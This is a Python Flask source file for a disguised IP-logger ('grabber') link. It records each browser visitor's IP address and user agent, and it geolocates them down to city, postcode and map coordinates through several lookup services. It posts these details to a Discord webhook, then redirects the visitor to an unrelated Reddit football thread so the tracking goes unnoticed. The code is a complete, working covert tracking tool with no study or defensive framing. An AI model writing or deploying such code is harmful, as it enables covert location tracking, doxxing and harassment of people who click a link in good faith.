import os
import requests
from datetime import datetime
from flask import Flask, request, redirect, jsonify
from threading import Thread

# optional geoip2 reader — import only if available at runtime
try:
    import geoip2.database
except Exception:
    geoip2 = None

app = Flask(__name__)

# Load configuration from environment
DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "<paste-your-webhook-or-set-env>")
GEOIP_DB_PATH = os.environ.get("GEOIP_DB_PATH")  # e.g. "./GeoLite2-City.mmdb"
IPINFO_TOKEN = os.environ.get("IPINFO_TOKEN")
USER_AGENT_CONTACT = os.environ.get("USER_AGENT_CONTACT", "your-app@example.com")

logged_ips = set()
geoip_reader = None

# Initialize GeoIP reader if DB path provided and geoip2 available
if GEOIP_DB_PATH and geoip2:
    try:
        geoip_reader = geoip2.database.Reader(GEOIP_DB_PATH)
        print(f"GeoIP DB loaded from {GEOIP_DB_PATH}")
    except Exception as e:
        print(f"Failed to load GeoIP DB: {e}")
        geoip_reader = None
else:
    if GEOIP_DB_PATH and not geoip2:
        print("geoip2 package not installed; cannot use local GeoIP DB.")
    else:
        print("No GEOIP_DB_PATH provided; will use external services.")

def get_client_ip():
    """Return the real client IP, considering common proxy headers."""
    xff = request.headers.get("X-Forwarded-For", "")
    if xff:
        return xff.split(",")[0].strip()
    return request.remote_addr or "0.0.0.0"

def geoip_local_lookup(ip):
    """Try local MaxMind DB lookup. Return dict or {}."""
    if not geoip_reader:
        return {}
    try:
        rec = geoip_reader.city(ip)
        city = rec.city.name or ""
        region = rec.subdivisions.most_specific.name or ""
        country = rec.country.name or ""
        country_code = rec.country.iso_code or "XX"
        lat = rec.location.latitude or 0
        lon = rec.location.longitude or 0
        postal = rec.postal.code or ""
        return {
            "city": city,
            "region": region,
            "country": country,
            "countryCode": (country_code or "XX").lower(),
            "lat": lat,
            "lon": lon,
            "zip": postal,
        }
    except Exception as e:
        print(f"Local GeoIP lookup failed for {ip}: {e}")
        return {}

def ipinfo_lookup(ip):
    """Use ipinfo.io if token provided; returns dict or {}"""
    try:
        if IPINFO_TOKEN:
            url = f"https://ipinfo.io/{ip}/json?token={IPINFO_TOKEN}"
        else:
            url = f"https://ipinfo.io/{ip}/json"
        r = requests.get(url, timeout=5)
        if r.status_code != 200:
            print(f"ipinfo returned {r.status_code} for {ip}")
            return {}
        data = r.json()
        loc = data.get("loc", "")
        lat = lon = 0
        if loc:
            parts = loc.split(",")
            if len(parts) == 2:
                lat = float(parts[0])
                lon = float(parts[1])
        return {
            "city": data.get("city", ""),
            "region": data.get("region", ""),
            "country": data.get("country", ""),
            "countryCode": (data.get("country", "XX") or "XX").lower(),
            "lat": lat,
            "lon": lon,
            "zip": data.get("postal", ""),
        }
    except Exception as e:
        print(f"ipinfo exception for {ip}: {e}")
        return {}

def ipapi_lookup(ip):
    """Fallback to ipapi.co"""
    try:
        r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
        if r.status_code != 200:
            print(f"ipapi returned {r.status_code} for {ip}")
            return {}
        data = r.json()
        return {
            "city": data.get("city", ""),
            "region": data.get("region", ""),
            "country": data.get("country_name", ""),
            "countryCode": (data.get("country_code", "xx") or "xx").lower(),
            "lat": data.get("latitude") or 0,
            "lon": data.get("longitude") or 0,
            "zip": data.get("postal", ""),
        }
    except Exception as e:
        print(f"ipapi exception for {ip}: {e}")
        return {}

def reverse_geocode(lat, lon):
    """Reverse geocode using Nominatim (OpenStreetMap). Provide contact UA header."""
    try:
        url = "https://nominatim.openstreetmap.org/reverse"
        params = {"format": "jsonv2", "lat": lat, "lon": lon, "addressdetails": 1}
        headers = {"User-Agent": USER_AGENT_CONTACT}
        r = requests.get(url, params=params, headers=headers, timeout=5)
        if r.status_code != 200:
            print(f"Nominatim returned {r.status_code}")
            return {}
        data = r.json()
        address = data.get("address", {})
        city = address.get("city") or address.get("town") or address.get("village") or address.get("hamlet") or ""
        region = address.get("state") or address.get("region") or ""
        country = address.get("country") or ""
        country_code = address.get("country_code", "xx")
        return {
            "city": city,
            "region": region,
            "country": country,
            "countryCode": country_code.lower(),
            "lat": lat,
            "lon": lon,
            "zip": address.get("postcode", "")
        }
    except Exception as e:
        print(f"Reverse geocode failed: {e}")
        return {}

def get_visitor_info(ip, user_agent, client_coords=None):
    """Main aggregator: try client coords -> local DB -> ipinfo -> ipapi."""
    info = {
        "ip": ip,
        "user_agent": user_agent,
        "country": "",
        "countryCode": "xx",
        "region": "",
        "city": "",
        "zip": "",
        "lat": 0,
        "lon": 0,
        "date": datetime.utcnow().strftime("%d/%m/%Y"),
        "time": datetime.utcnow().strftime("%H:%M:%S"),
    }

    # 1) If client provided coords, reverse geocode first
    if client_coords and client_coords.get("lat") is not None:
        try:
            lat = float(client_coords.get("lat"))
            lon = float(client_coords.get("lon"))
            rev = reverse_geocode(lat, lon)
            if rev:
                info.update(rev)
                info["lat"] = lat
                info["lon"] = lon
                return info
        except Exception as e:
            print(f"Error handling client coords: {e}")

    # 2) Try local GeoIP DB
    local = geoip_local_lookup(ip)
    if local:
        info.update(local)
        return info

    # 3) Try ipinfo
    ipinfo = ipinfo_lookup(ip)
    if ipinfo and (ipinfo.get("city") or ipinfo.get("country")):
        info.update(ipinfo)
        return info

    # 4) Fallback to ipapi
    ipapi = ipapi_lookup(ip)
    if ipapi and (ipapi.get("city") or ipapi.get("country")):
        info.update(ipapi)
        return info

    # If all fail, set safe defaults but include IP and UA
    info["city"] = "Unknown Location"
    info["region"] = "Unknown Region"
    info["country"] = "Unknown"
    info["countryCode"] = "xx"
    return info

def send_to_discord(info):
    flag_url = f"https://countryflagsapi.com/png/{info.get('countryCode','xx')}"
    ip_city = f"{info['ip']} ({info.get('city') or 'Unknown Location'})"
    embed = {
        "username": "PUTA BARCA",
        "avatar_url": flag_url,
        "embeds": [{
            "title": f"🌍 Visitor From {info.get('country','Unknown')}",
            "color": 39423,
            "fields": [
                {"name": "IP & City", "value": ip_city, "inline": True},
                {"name": "User Agent", "value": info.get("user_agent","Unknown"), "inline": False},
                {"name": "Country / Code", "value": f"{info.get('country')} / {info.get('countryCode').upper()}", "inline": True},
                {"name": "Region | City | Zip", "value": f"{info.get('region')} | {info.get('city')} | {info.get('zip')}", "inline": True},
                {"name": "Google Maps", "value": f"[View Location](https://www.google.com/maps?q={info.get('lat')},{info.get('lon')})", "inline": False},
            ],
            "footer": {
                "text": f"Time (GMT): {info['date']} {info['time']}",
                "icon_url": "https://e7.pngegg.com/pngimages/766/619/png-clipart-emoji-alarm-clocks-alarm-clock-time-emoticon.png"
            }
        }]
    }
    response = requests.post(DISCORD_WEBHOOK_URL, json=embed, headers={"Content-Type": "application/json"})
    print(f"Webhook sent with status code {response.status_code}")

def handle_request():
    ip = get_client_ip()
    user_agent = request.headers.get("User-Agent", "Unknown")
    if ip not in logged_ips and "Mozilla" in user_agent:
        logged_ips.add(ip)
        info = get_visitor_info(ip, user_agent)
        # Send the webhook in the background thread
        Thread(target=send_to_discord, args=(info,)).start()
    return redirect("https://www.reddit.com/r/football/comments/16n8k5s/can_a_taller_player_become_renowned_for_their/")

@app.route('/')
def index():
    return handle_request()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)

